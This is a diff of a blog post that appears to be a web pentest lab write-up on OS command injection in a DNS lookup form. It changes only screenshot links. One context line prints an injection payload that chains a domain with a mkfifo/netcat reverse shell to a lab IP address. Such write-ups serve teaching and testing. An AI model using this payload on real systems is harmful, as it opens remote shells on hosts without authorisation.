@@ -7,13 +7,13 @@ categories:
 
 <br>As you can see this is DNS lookup but, it has OS Command injection vulnerability using which we can execute system command.
 
-![28](https://teckk2.github.io/assets/images/Web%20Pentest/A1/28.png)
-![29](https://teckk2.github.io/assets/images/Web%20Pentest/A1/29.png)
-![30](https://teckk2.github.io/assets/images/Web%20Pentest/A1/30.png)
+![28.2](https://teckk2.github.io/assets/images/Web%20Pentest/A1/28.2.png)
+![29.1](https://teckk2.github.io/assets/images/Web%20Pentest/A1/29.1.png)
+![30.1](https://teckk2.github.io/assets/images/Web%20Pentest/A1/30.1.png)
 <br>We can even get the reverse shell out of it.
-![31](https://teckk2.github.io/assets/images/Web%20Pentest/A1/31.png)
+![31.1](https://teckk2.github.io/assets/images/Web%20Pentest/A1/31.1.png)
 <br><font color="Black">www.nsa.gov && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.140.136 4455 >/tmp/f</font>
-![32](https://teckk2.github.io/assets/images/Web%20Pentest/A1/32.png)
+![32.1](https://teckk2.github.io/assets/images/Web%20Pentest/A1/32.1.png)
 
 <p class="message">
   ~ Hack the World and Stay Noob
